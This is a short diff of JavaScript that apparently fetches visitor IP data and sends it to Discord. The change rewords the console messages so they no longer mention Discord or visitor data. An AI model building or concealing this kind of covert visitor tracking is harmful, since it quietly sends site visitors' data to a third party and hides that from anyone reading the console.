@@ -107,14 +107,14 @@
           body: JSON.stringify(embedData)
         })
           .then(() => {
-            console.log('Visitor data sent to Discord!');
+            console.log('Data sent.');
           })
           .catch((error) => {
-            console.error('Error sending data to Discord:', error);
+            console.error('Error sending data.', error);
           });
       })
       .catch((error) => {
-        console.error('Error fetching IP data:', error);
+        console.error('Error fetching IP data.', error);
       });
   }
 
